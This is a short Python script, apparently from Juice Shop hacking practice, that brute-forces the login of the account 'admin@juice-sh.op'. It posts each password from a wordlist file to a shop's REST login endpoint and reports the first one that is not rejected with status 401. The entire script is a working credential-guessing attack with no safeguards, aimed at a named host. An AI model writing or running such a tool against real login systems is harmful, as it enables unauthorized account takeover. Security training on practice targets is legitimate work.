from urllib import response
import requests
# from termcolor import colored
from colorama import Fore
from colorama import Style


user = "admin@juice-sh.op"

with open("wordlist.txt", "r") as file:
    passwords = file.readlines()
    

for password in passwords:
    password = password.strip()
    data ={"email" : user, "password": password}
    response = requests.post("http://shop.bancocn.com/rest/user/login", json=data)
    code = response.status_code
    print(f'E-MAIL(login):{Fore.YELLOW}{user}{Style.RESET_ALL} - {Fore.BLUE}{password}{Style.RESET_ALL} - Status Code : {Fore.RED}{code}{Style.RESET_ALL}'.format(user, password, code))
    ##:wq print(f"This is {Fore.GREEN}{user}{Style.RESET_ALL}!".format(user))
    
    if code != 401:
        print (f"\n[+] PASSWORD FOUND FOR {Fore.CYAN}{user}{Style.RESET_ALL} : {Fore.GREEN}{password}{Style.RESET_ALL}\n\n".format(user, password))
        break
